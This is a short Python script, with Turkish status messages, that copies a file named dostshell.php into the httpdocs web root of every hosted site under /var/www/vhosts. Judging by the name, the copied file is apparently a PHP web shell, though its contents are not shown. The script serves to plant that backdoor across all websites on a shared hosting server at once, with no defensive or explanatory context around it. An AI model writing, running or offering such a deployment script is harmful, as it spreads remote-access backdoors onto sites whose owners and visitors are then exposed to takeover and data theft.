import glob
import shutil

source_file = '/var/www/vhosts/dostshell.php'

for target_dir in glob.glob('/var/www/vhosts/*/httpdocs/'):
    try:
        shutil.copy(source_file, target_dir)
        print(f"{source_file} kopyalandi -> {target_dir}")
    except Exception as e:
        print(f"Hata: {target_dir} icine kopyalanamadi. {e}")
